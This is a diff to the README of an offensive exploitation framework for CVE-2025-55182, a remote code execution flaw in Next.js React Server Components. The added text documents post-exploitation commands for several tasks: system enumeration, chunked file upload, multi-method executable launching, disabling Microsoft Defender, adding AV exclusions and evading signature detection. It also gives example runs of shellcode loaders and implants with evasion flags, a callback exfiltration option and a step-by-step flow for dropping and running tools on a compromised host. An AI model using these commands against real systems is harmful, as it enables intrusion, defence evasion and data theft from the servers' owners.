@@ -1,4 +1,4 @@
-# React2Shell Advanced
+# React2Shell Advanced v3
 
 Advanced exploitation framework for **CVE-2025-55182** — Remote Code Execution in Next.js React Server Components via insecure deserialization in the Flight protocol.
 
@@ -20,8 +20,8 @@ Advanced exploitation framework for **CVE-2025-55182** — Remote Code Execution
 - Custom Host header for reverse-proxy bypass (`-H domain`)
 - Auto domain resolution from IP via reverse DNS
 
-### Post-Exploitation
-- **`.info`** — Quick system enumeration (user, OS, IP, privileges)
+### Post-Exploitation Enumeration
+- **`.info`** — Quick system enumeration (user, OS, IP, privileges, AV)
 - **`.fullinfo`** — Comprehensive enumeration (runs all modules below)
 - **`.users`** — User enumeration, group membership, privileges
 - **`.ps`** — Running processes
@@ -34,12 +34,29 @@ Advanced exploitation framework for **CVE-2025-55182** — Remote Code Execution
 - **`.software`** — Installed software, patches, runtime versions
 
 ### File Operations
-- **`.upload`** — Upload files via chunked base64 (PowerShell/certutil on Windows, echo/base64 on Linux)
-- **`.download`** — Download files from target
-- **`.cat`** — Cross-platform file reader (`type` on Windows, `cat` on Linux)
+- **`.upload`** — Chunked upload with 6KB chunks, PowerShell `Set-Content`/`Add-Content` (no `\r\n` corruption), retry logic (3 attempts/chunk), file size verification
+- **`.download`** — Download files from target (base64 via PowerShell/base64)
+- **`.cat`** — Cross-platform file reader with auto backslash→forward-slash conversion
+
+### Execution Tactics
+- **`.exec path [args]`** — Smart executable launcher:
+  - Resolves relative paths to full CWD-based paths
+  - Checks file existence before attempting execution
+  - Tries: `cmd /c` (full path), `cmd /c` (`.\` prefix), PowerShell, WMIC, background `start`
+  - Interprets WMIC return codes (0=Success, 2=Access Denied, 9=Path Not Found, etc.)
+  - Detects AV-blocked output
+  - Last resort: copy+rename with random name to evade signature detection
+- **`.bg cmd`** — Fire-and-forget background execution (no output wait)
+- **`.kill pid|name`** — Kill process by PID or image name
+
+### AV/Defender Management
+- **`.av`** — Full AV status: Defender RT protection, exclusions, running AV processes, **recent threat detections**
+- **`.avoff`** — Disable Defender real-time monitoring (tries `Set-MpPreference`, `sc config`, `sc stop`, registry)
+- **`.exclude path`** — Add Defender exclusion path
 
 ### Shell
-- Directory traversal with `cd` (uses Node.js `cwd` option — no path escaping issues)
+- All commands auto-capture **stderr** (`2>&1`) — no more silent failures
+- Directory traversal with `cd` (Windows: forward-slash CWD, bare drive letters `cd C:`, `cd ..` at root)
 - Readline history, output saving, interactive prompt with status display
 - Multi-channel exfiltration: redirect, error, OOB callback, DNS
 
@@ -74,7 +91,7 @@ python3 react2shell_advanced.py -u https://target.com -j 2 -o 3 --bypass medium
 python3 react2shell_advanced.py -u https://target.com --exfil callback --callback-url http://YOUR_IP:PORT
 ```
 
-## Shell Commands
+## Shell Commands Reference
 
 ### Exploit Controls
 | Command | Description |
@@ -107,10 +124,24 @@ python3 react2shell_advanced.py -u https://target.com --exfil callback --callbac
 ### File Operations
 | Command | Description |
 |---------|-------------|
-| `.upload local remote` | Upload file to target |
+| `.upload local remote` | Upload file (chunked, retries, size verification) |
 | `.download remote [local]` | Download file from target |
 | `.cat path` | Read file content |
-| `cd path` | Change directory |
+| `cd path` | Change directory (supports `cd C:`, `cd ..`) |
+
+### Execution
+| Command | Description |
+|---------|-------------|
+| `.exec path [args]` | Smart exe launcher (tries 5+ methods) |
+| `.bg cmd` | Background execution (fire & forget) |
+| `.kill pid\|name` | Kill process by PID or name |
+
+### AV/Defender
+| Command | Description |
+|---------|-------------|
+| `.av` | AV status, exclusions, recent threats |
+| `.avoff` | Disable Defender real-time protection |
+| `.exclude path` | Add Defender exclusion path |
 
 ### Utility
 | Command | Description |
@@ -121,6 +152,36 @@ python3 react2shell_advanced.py -u https://target.com --exfil callback --callbac
 | `.root` | Toggle sudo mode (Linux) |
 | `.timeout N` | Set request timeout |
 | `.waf` | Fingerprint WAF |
+
+## Running Complex Commands
+
+Commands typed directly in the shell automatically capture stderr. For executables with arguments:
+
+```bash
+# Direct execution (auto-captures stderr)
+user@target$ lsasp.exe --payload rundll.enc --verbose
+
+# Smart launcher with full path resolution + multi-method fallback
+user@target$ .exec lsasp.exe --payload rundll.enc --encrypted --password "S3cret!" --type shellcode --exec-mode fork --verbose
+
+# Fire-and-forget for tools that run silently (shellcode loaders, implants)
+user@target$ .bg lsasp.exe --payload rundll.enc --encrypted --password "S3cret!" --type shellcode --exec-mode fork --blinding --stack-spoof --no-cleanup
+
+# If Defender blocks execution:
+user@target$ .av                          # Check AV status and what was blocked
+user@target$ .avoff                       # Try to disable RT protection
+user@target$ .exclude c:\Users\Public     # Or add exclusion for your drop directory
+user@target$ .upload tool.exe c:\Users\Public\tool.exe   # Re-upload
+user@target$ .exec tool.exe              # Try again
+```
+
+### Recommended Execution Flow
+1. **Upload**: `.upload /local/path/tool.exe c:\Users\Public\tool.exe`
+2. **Check AV**: `.av` — see if Defender is active
+3. **Exclude** (if needed): `.exclude c:\Users\Public`
+4. **Execute**: `.exec tool.exe --flags` — smart launcher tries all methods
+5. **Background** (if silent tool): `.bg tool.exe --flags`
+6. **Verify**: `tasklist | findstr tool` — check if process is running
 
 ## CLI Options
 
